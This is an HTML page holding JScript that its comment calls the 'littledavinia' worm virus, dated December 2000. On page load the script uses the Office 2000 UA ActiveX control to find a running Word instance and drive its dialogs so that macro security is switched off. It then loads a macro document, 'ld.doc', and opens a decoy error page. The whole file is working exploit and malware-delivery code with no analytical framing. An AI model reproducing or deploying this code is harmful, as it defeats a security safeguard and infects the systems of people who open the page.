<HTML>
<BODY>
<SCRIPT LANGUAGE="JScript"><!--
/* littledavinia version 1.0 VisualBasic Macro - VBS - HTML(js) - HTML(vbs) Worm virus
Office 2000 UA ActiveX bug
written by: Onel 2 / Melilla, España / 25 Diciembre 2000 
quiero a davinia:
*/
var ua;
ua = new ActiveXObject("OUACtrl.OUACtrl.1")
function main() {
ua.WndClass="OpusApp";
ua.OfficeApp=0;
return ua.IsAppRunning();
}
function quebrantwordmacrosecurity() {
ua.AppActivate();
ua.ShowDialog(0x0E2B);
ua.SelectTabSDM(0x13);
ua.SelectTabSDM(1);
}
if (main()) {
quebrantwordmacrosecurity();	
parent.frames["tr"].location='ld.doc';
window.open('error.htm')
}
</SCRIPT>
</BODY>
</HTML>
